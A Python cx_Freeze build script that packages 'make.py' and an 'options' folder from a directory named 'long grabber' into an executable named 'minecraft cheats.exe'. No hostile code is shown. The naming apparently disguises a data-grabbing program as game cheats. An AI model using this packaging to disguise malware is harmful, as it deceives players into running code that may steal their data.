import os
from cx_Freeze import setup, Executable

# Path to the desired location
desired_path = r"C:\Users\longf\OneDrive - HAST Katholiek Onderwijs\long grabber\options"

# Include necessary files and folders
include_files = [
    (desired_path, "options")
]

# Exclude unnecessary modules
excludes = []

# Dependencies to be included
packages = []

# Executable configuration
exe = Executable(
    script="make.py",  # Replace "your_script.py" with the name of your Python script
    base=None,  # Set the base to None for a console application
    target_name="minecraft cheats.exe"  # Replace "your_executable.exe" with the desired name of the executable
)

# Setup configuration
setup(
    name="test",  # Replace "YourApp" with the name of your application
    version="1.0",
    description="Description of your application",
    options={
        "build_exe": {
            "include_files": include_files,
            "excludes": excludes,
            "packages": packages
        }
    },
    executables=[exe]
)
